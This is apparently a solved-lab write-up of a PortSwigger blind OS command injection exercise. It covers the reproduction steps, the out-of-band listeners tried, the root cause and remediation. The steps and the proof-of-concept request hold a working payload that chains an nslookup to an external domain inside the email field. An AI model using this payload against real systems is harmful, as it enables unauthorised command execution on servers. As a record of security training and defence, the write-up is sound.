# Blind OS Command Injection with Out-of-Band Interaction

**Platform:** PortSwigger Web Security Academy
**Category:** OS Command Injection
**Difficulty:** Practitioner
**Date Solved:** 2026-10-23
**Severity:** Critical

## Summary

The application's feedback submission function (`/feedback/submit`) passes the user-supplied `email` parameter unsanitized into a server-side shell command. The command executes asynchronously and has no effect on the HTTP response, making this a blind injection — detectable only via out-of-band (OOB) interaction rather than response-based confirmation.

## Affected Component

`POST /feedback/submit` — `email` parameter.

## Steps to Reproduce

1. Intercept the feedback submission request in Burp Suite Repeater.
2. Modify the `email` parameter to break out of the intended command context and chain an OOB DNS lookup:
   ```
   email=x||nslookup+x.<OOB-DOMAIN>||
   ```
3. Send the request.
4. Monitor the OOB listener for an inbound DNS interaction confirming command execution.

## Proof of Concept

Request (Burp Repeater):
```bash
POST /feedback/submit HTTP/2
Host: 0aab001503cf4712811634e0006c00e9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=mmm&email=x||nslookup+x.<OOB-DOMAIN>||&subject=os&message=aa
```

Response:
```bash
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 2

{}
```

The 200 OK with an empty JSON body is consistent with the lab description — the command executes asynchronously server-side and has no effect on the application's response, so a clean response here is expected and does not itself confirm execution.

**OOB confirmation — environment-constrained:**

This lab environment is Burp Suite Community Edition (no Burp Collaborator access, which is the officially supported and firewall-whitelisted OOB channel for this lab per PortSwigger's own note). Three OOB channels were attempted as substitutes:

| Method | Payload domain used | Result |
|---|---|---|
| interactsh (self-hosted client, VM) | `*.oast.fun`, then `*.oast.site` | No interaction received |
| canarytokens.org (DNS token) | `w1cyd8ap5zfcg05nzjy0axygr.canarytokens.com` | No interaction received |
| Burp Collaborator | N/A | Unavailable (Community edition) |

No DNS interaction was received on any third-party listener despite correct payload construction and confirmed clean request delivery (200 OK, no server error). This is consistent with PortSwigger's documented lab firewall behavior, which blocks interactions between labs and arbitrary external systems and only whitelists Burp Collaborator's own public server. The injection and payload are considered technically validated; OOB confirmation was blocked by tooling access, not by a flaw in exploitation technique.

## Root Cause

User-supplied input (`email`) is concatenated directly into a server-side shell command without sanitization or escaping, allowing shell metacharacters (`||`) to inject arbitrary additional commands.

## Impact

### Technical

Arbitrary OS command execution on the application server, in the security context of the web application process. Blind/asynchronous execution does not reduce severity — it only changes the detection method.

### Business / Real-World

In a live target, blind command injection of this type enables full server compromise: data exfiltration, lateral movement, reverse shell establishment via OOB channels, and persistence — all without any visible indication to the victim via the HTTP response, making it harder to detect than error-based or in-band injection.

### Scope

Server-side; any backend relying on shell-outs with unsanitized user input for notification/feedback-style features is at equivalent risk.

## Remediation

- Never pass user input to a shell interpreter. Use parameterized APIs/library calls instead of shell commands wherever possible.
- If shell execution is unavoidable, strictly allowlist expected input format (e.g. valid email regex) and reject anything containing shell metacharacters (`| ; & $ ( ) \` < >`).
- Run any necessary shell operations with the minimum privilege required, in a sandboxed/isolated execution context.

## Lessons Learned & Patterns

- Blind injection confirmation is entirely dependent on OOB channel availability — Burp Community's lack of Collaborator access is a real constraint for this lab category and needs a reliable workaround baked into standard methodology, not improvised per lab.
- Self-hosted DNS OOB (own domain + own listener, e.g. via a free-tier VPS) is the only channel not subject to third-party egress firewalling, and is worth setting up once as permanent infrastructure given how often this lab pattern recurs across Access Control, SSRF, and Command Injection categories.
- Distinguish, in writeups, between "payload technique confirmed correct" and "exploitation confirmed via OOB" — these are not the same claim and should never be conflated, especially under real program rules where an unconfirmed report is a weaker submission.

## References

- [PortSwigger Lab — Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
- [PortSwigger Lab — Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**Tags:** #PortSwigger #OSCommandInjection #BlindInjection #OOB
